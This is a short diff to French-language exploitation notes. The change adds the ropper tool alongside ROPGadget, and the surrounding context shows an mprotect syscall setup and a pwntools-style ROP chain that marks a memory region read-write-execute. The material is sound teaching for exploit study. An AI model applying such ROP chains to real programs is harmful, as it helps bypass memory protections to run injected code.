@@ -22,7 +22,7 @@ mov rdx, 0x7            ; protections: PROT_READ | PROT_WRITE | PROT_EXEC
 syscall                 ; appel du syscall
 ```
 ### avec des : pop *registre* ; ret
-Les adresses des pop sont trouvées avec ROPGadget
+Les adresses des pop sont trouvées avec ROPGadget ou avec ropper (--nocolor)
 ```
 ROPCHAIN = p64(pop_rdi) + p64(0x00000000006bc000) #adresse du début de la zone mémoire
 					+ p64(pop_rdx) + p64(0x7) #les droits rwx
